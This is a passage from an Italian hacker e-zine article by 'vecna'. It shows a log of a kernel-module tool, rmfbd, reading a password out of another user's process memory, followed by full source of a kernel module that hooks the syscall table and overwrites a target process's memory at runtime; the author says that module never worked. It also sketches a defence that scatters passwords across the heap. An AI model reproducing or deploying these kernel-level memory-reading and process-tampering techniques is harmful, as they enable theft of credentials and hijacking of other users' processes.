+4 SYS_pread (unsigned int a, void *b, size_t c, loff_t d)
+3 SYS_poll (struct pollfd *a, unsigned int b, long c)
+2 SYS_flock (unsigned int a, unsigned int b)
+1 SYS_fdatasync (unsigned int a)
+3 SYS_sysfs (int a, unsigned long b, unsigned long c)
+2 SYS_sethostname (char *a, len b)
+0 SYS_geteuid ()
+2 SYS_capset (cap_user_header_t a, const cap_user_data_t b)
+2 SYS_utime (char *a, struct utimbuf *b)
+1 SYS_fchdir (unsigned int a)
+3 SYS_getresuid (uid_t a, uid_t b, uid_t c)
+4 SYS_sendfile (int a, int b, off_t *c, size_t d)
+1 SYS_time (int *a)
+2 SYS_setreuid (uid_t a, uid_t b)
+5 SYS_select (int a, fd_set *b, fd_set *c, fd_set *d, struct timeval *e)
+2 SYS_ustat (dev_t a, struct ustat *b)
+2 SYS_mkdir (const char *a, int b)
+1 SYS_rmdir (const char *a)
+1 SYS_adjtimex (struct timex *a)
+1 SYS_acct (const char *a)
+1 SYS_mlockall (int a)
+2 SYS_fstatfs (unsigned int a, struct statfs *b)
+2 SYS_stat (char *a, struct __old_kernel_stat *b)
+1 SYS_chdir (char *a)
+3 SYS_syslog (int a, char *b, int c)
+2 SYS_fchmod (unsigned int a, mode_t b)
+3 SYS_readlink (const char *a, char *b, int c)
+0 SYS_sync ()
+3 SYS_fchown (unsigned int a, uid_t b, gid_t c)
+2 SYS_access (char *a, int b)
+2 SYS_gettimeofday (struct timeval *a, struct timezone *b)
+3 SYS_mknod (char *a, int b, dev_t c)
+2 SYS_getgroups (int a, gid_t *b)
+2 SYS_chmod (char *a, mode_t b)
+2 SYS_mlock (unsigned long a, size_t b)
+1 SYS_unlink (const char *a)
+1 SYS_sysctl (struct __sysctl_args *a)
+3 SYS_sigprocmask (int a, old_sigset_t *b, old_sigset_t *c)
+3 SYS_lseek (unsigned int a, off_t b, unigned int c)
+3 SYS_setpriority (int a, int b, int c)
+3 SYS_chown (const char *a, uid_t b, gid_t c)
+<-X->
+
+se vi rompe far copia incolla usate snip2.c per estrarre automaticamente
+i file da questo articolo, lo trovate su BFi09 file 21 o in questo BFi11.
+
+
+-] ESEMPIO DI FUNZIONAMENTO DI rmfbd -----------------------------------------
+
+>>>> in un'altra tty un tizio entra e vede quel processo sapendo che c'e`
+>>>> una password che gli interessa.
+
+573./home/vecna/wrk/kernel/rmfbd# ./build.sh
+x): clean temp file and possible old object
+tell me what kind of memory do you needed to hack, stack/heap/kernel
+heap
+1): compiling and start program for memory test
+2): building module for take first offset
+    offset retrivered is 4294967168
+    remove module for get memory offset
+    killing ./minimal background process
+3): work with module for memory scanning
+insert system call to monitor: write
+./build.sh: line 108:   515 Killed                  ./minimal
+_insert key to search on test program
+keytest
+please switch tty and start test program ... press any key after
+
+>>>> in un'altra nostra tty o mettendo ./build.sh in bg x un attimo
+24.~/root# ./keyreader
+ Insert key:
+password [keytest] at 8049e50 pid 550
+
+>>>> da ./build.sh, dopo un invio parte un ps | axf per farci veder il pid
+>>>> del nostro programma di test
+
+what's pid of test program ?
+550
+done ... loading of module for memory scanning... keytest 4294967168 550
+    scanning 2 seconds for search key
+4) compiling final module for seek at 1616
+_insert pid of target program
+458
+    waiting 2 seconds for find secret key
+#) end, on ./secret_report you may find the key
+574./home/vecna/wrk/kernel/rmfbd# cat secret_report
+Dec 17 14:11:52 mail kernel: SIGTL3: [t][o][p][s][e][c][r][e][t][[[[[[[
+Dec 17 14:11:53 mail kernel: SIGTL3: [t][o][p][s][e][c][r][e][t][[[[[[[
+575./home/vecna/wrk/kernel/rmfbd#
+
+
+-] PROBLEMI INVOLONTARI DELLE FEATURES DI SICUREZZA E CONTROMISURE A rmfbd --
+
+questo sistema mi e` venuto in mente vedendo lavorare anni fa' PGP.
+il suddetto programma prima di crittare un file mi diceva sempre:
+"attenzione, si sta per lavorare in un'area di memoria non sicura!"
+e il punto di domanda cosmico sorse nella mia testa... che differenza
+ci sara` mai tra la memoria sicura e quella insicura... poi scoprii che
+la memoria sicura o no dipende da una chiamata di shmctl(2) e che per
+proteggere la memoria c'e` anche mprotect(2) ed mlock(2), tutte quante
+forniscono protezioni diverse e senza dubbio utili, il problema e` che
+se tutti i programmi avessero usato queste chiamate per leggere le password,
+il mio lavoro sarebbe stato molto + semplice dal momento che avrei potuto
+usare quelle chiamate come *indicatori* di password, avrei beccato subito la
+zona di memoria protetta, mi sarei salvato l'indirizzo e il pid, avrei
+fatto il dump delle memorie ad un mio segnale, e avrei risparmiato tempo
+invece buttato in template.syscall :)
+l'unica soluzione che mi viene in mente, e` di tener la password sparsa
+per la memoria, con una chiamata read_password() che legga la key da stdin
+senza echo, poi con un doppio puntatore allocato in un punto random
+con puntatori che puntano a zone da 1 byte random nell'heap, in modo da
+poter rintracciare la password quando viene richiesta tramite una funzione
+tipo get_password, ma facendo in modo che la lettura della memoria sia 
+impossibile.
+
+char *rand_malloc(unsigned int size)
+        {
+	void *foo, *ret;
+	static int foospace =32;
+
+	srand(time(NULL));
+
+	foospace *=getrandom(2, 256);
+	foospace %=256;
+
+	foo =malloc(foospace);
+	ret =malloc(size);
+
+	if(foo ==NULL || ret ==NULL)
+		{
+		perror("malloc");
+		exit(EXIT_FAILURE);
+		}
+
+	memset(ret, 0x00, size);
+	free(foo);
+
+	return ret;
+	}
+
+in main:
+
+	char **key =NULL;
+	int keylen =0;
+	
+        /* for keep the key scattered on the memory */
+        key =(char **)rand_malloc(strlen(buff_1));
+        keylen =strlen(buff_1);
+
+        for(cnt =0; cnt !=keylen; cnt++)
+                {
+                key[cnt] =rand_malloc(sizeof(char));
+                memcpy(key[cnt], &buff_1[cnt], sizeof(char));
+                }
+
+ed ecco che in **key c'e` la password, ma non e` leggibile.
+nella stessa lib ci vuole una funzione che legga poco a poco i byte dentro
+a **key e restituisca il buffer. questo e` + lento, innegabile.
+
+
+-] HACKING DI PROCESSI IN ESECUZIONE -----------------------------------------
+
+un'idea balzana e molto interessante che mi venne fu quella di cercar di
+cambiare ad un processo gia` avviato quello che sta` eseguendo, come se io
+cambiassi il codice on the fly in modo che il processo cambi quello che sta
+eseguendo.
+per aiutarmi e non dover fare diff di codice, di obj, cercare di capire come
+sarebbe stata la rappresentazione in memoria dell'ELF ecc... pensavo di fare
+un lavoro di questo genere:
+faccio andare un processo (quello che teoricamente vorrei modificare) faccio
+partire la mia parte tarocca (quello che vorrei injectare) leggo in memoria,
+quando trovo differenza tra la roba in memoria in esecuzione prendo e cambio.
+
+teoricamente non so se potrebbe andare, praticamente non e` mai andato...
+sono riuscito a trovar le diversita` tra 2 programmi leggermente modificati,
+sono riuscito a scrivere nella memoria del processo target i byte differenti,
+ma praticamente non e` cambiato nulla nell'esecuzione. visto che non ho idea
+di come farlo, cioe` ... + che altro non ho ben presente come funzionano
+gli ELF e l'esecuzione, ho visto che c'e` un file apposta nel kernel per
+ogni formato di binario supportato, ma purtroppo non ho la voglia di leggerlo,
+nel caso qualcuno ci sbattesse la testa xke` gli interessa approfondire se
+gli va potremmo anche continuare insieme. per ora quello che avevo provato
+era una cazzatina ottenuta modificando rmfbd_step1.c 
+
+ecco qui:
+
+<-| rmfbd/BAD_CODE_rmfbd_rh.c |->
+#define MODULE
+#define __KERNEL__
+
+#include <linux/config.h>
+#include <linux/version.h>
+#include <linux/types.h>
+#include <linux/kernel.h>
+#include <linux/mm.h>
+#include <linux/module.h>
+#include <linux/sched.h>
+#include <sys/syscall.h>
+#include <asm/uaccess.h>
+
+extern void *sys_call_table[];
+
+/* pid of copy of program to analyze */
+MODULE_PARM(dpid, "i");
+MODULE_PARM(spid, "i");
+
+#define LIMIT 256
+
+/* for force module to quit when needed */
+static void cleanup_module(void);
+
+static int dpid, spid;
+
+#define MEMCHECKN	3
+
+#define STACKMEM	0
+#define CODEMEM		1
+#define DATAMEM		2
+
+static void *take_m_addr(int mem_index, struct task_struct *proc)
+	{
+	printk(KERN_INFO "take_m_addr con mem_index a %d\n", mem_index);
+	switch(mem_index)
+		{
+		case STACKMEM:
+			return (void *)proc->mm->start_stack;
+		case CODEMEM:
+			return (void *)proc->mm->start_code;
+		case DATAMEM:
+			return (void *)proc->mm->start_data;
+		default:
+			return NULL;
+		}
+	}
+
+static void memory_hack()
+	{
+	static struct task_struct *source, *dest;
+	static void *src_m_addr, *dst_m_addr;
+	static int counter, check_num;
+
+	if(counter ==LIMIT)
+		{
+		/* if all memory was already scanned */
+		if(check_num ==MEMCHECKN)
+			return;
+
+		/* unset and back to scan on new place */
+		dest =source =src_m_addr =dst_m_addr =NULL;
+		counter =0x0000;
+		}
+
+	if(dest ==NULL || source ==NULL)
+		{
+		if((dest =find_task_by_pid(dpid)) ==NULL)
+			{
+			printk(KERN_INFO);
+			printk("error with pid %d, unable to find\n", dpid);
+			}
+		else
+			dst_m_addr =take_m_addr(check_num, dest);
+
+		if((source =find_task_by_pid(spid)) ==NULL)
+			{
+			printk(KERN_INFO);
+			printk("error with pid %d, unable to find\n", spid);
+			}
+		else
+			src_m_addr =take_m_addr(check_num, source);
+
+		if(dest !=NULL && source !=NULL)
+			check_num++;
+		}
+
+	if(src_m_addr !=NULL && dst_m_addr !=NULL)
+		{
+		static char s_byte, d_byte;
+		/* source byte pointer,		*
+		 * dest byte pointer,		*
+		 * to copy byte 		*/
+		static char *sbp, *dbp, tcb;
+	 	/* to copy offset 		*/
+		static int tco;
+ 
+		if(dest->pid ==current->pid)
+			{
+			d_byte =*(char *)((unsigned int)dst_m_addr +counter);
+			dbp =&d_byte;
+			}
+
+		if(source->pid ==current->pid)
+			{
+			s_byte =*(char *)((unsigned int)src_m_addr +counter);
+			sbp =&s_byte;
+			}
+		/* 
+		 * read byte when schedule is over our two process and set 
+		 * internal pointer for help the function below
+		 * (I cannot use s_byte and d_byte because I can also copy
+		 * byte with 0x00 value...
+		 */
+
+		if(dbp !=NULL && sbp !=NULL)
+			{
+			if(*dbp !=*sbp)
+				{
+				printk(KERN_INFO "check_num %d cnt %d "
+						"s_byte %x d_byte %x\n",
+					check_num, counter, s_byte, d_byte);
+
+				tco =counter;
+				tcb =d_byte; 
+				}
+
+			sbp =dbp =NULL;
+
+			counter++;
+			}
+
+		if(tco && tcb && current->pid ==dest->pid)
+			{
+			printk(KERN_INFO "check_num %d cambio tco %d "
+					"tcb %x pid %d\n",
+					check_num, tco, tcb, current->pid);
+
+			*(char *)(dst_m_addr +tco) =tcb;
+
+			tco =tcb =0;
+			}
+		}
+	}
+
+#include "funct_df.c"
+
+int init_module(void)
+	{
+
+	if(!dpid || !spid)
+		{
+		printk(KERN_INFO "dpid is pid of target program, spid of");
+		printk(" the new code to copy over target\n");
+		printk(KERN_INFO "usage insmod rmfbd_rh dpid=X spid=Y\n");
+
+		return EINVAL;
+		}
+
+#include "sysch_df.c"
+
+	return(0);
+	}
+
+void cleanup_module(void)
+	{
+
+#include "sysrt_df.c"
+
+	}
+<-X->
+
+alla fine quello che fa la funzione in memory_hack() questa volta e`
+controllare a poco a poco le differenze che ci sono tra la memoria di 
+un processo e l'altro. le prove che ho fatto erano su diverse memorie,
+i programmi di test che ho usato erano cose che favevano un if e una printf
+e poi cercavo di cambiare quello che veniva scritto o di influire sul fatto
+che venisse scritto o meno, ma invano. per questo motivo ho anche provato a
+cambiare varia roba tra cui i buffer nell'heap o nello stack, le istruzioni
+che trovavo in data, quello che c'era in text... eppure non ho avuto alcun
+riscontro positivo.
+(poi tra l'altro ho 3 codici che non funzionano di rmfbd_rh [runtime hack]
+ma incollarli tutti mi pare un po' troppo, e cmq non funziona nessuno dei 3
+(ma tutti e 3 fan qualcosa di diverso) ripeto che se a qualcuno interessa
+glieli passo volentieri).
+
+
+-] AUTOREVOLE NOTA DELL'AUTORE ---------------------------------------------- 
+
+vecna@s0ftpj.org - http://www.s0ftpj.org, questo codice e` sotto GPL2 +
+solita licenza x cui se vi e` piaciuta sta roba o se l'avete ritenuta
+utile vi verran le vesciche finche` non mi offrirete una birra.
+
+
+-] TNX ----------------------------------------------------------------------
+
+ya per il codice perl, vodka sostegno, fusys consigli.
+
+
+==============================================================================
+---------------------------------[ EOF 6/15 ]---------------------------------
+==============================================================================
+
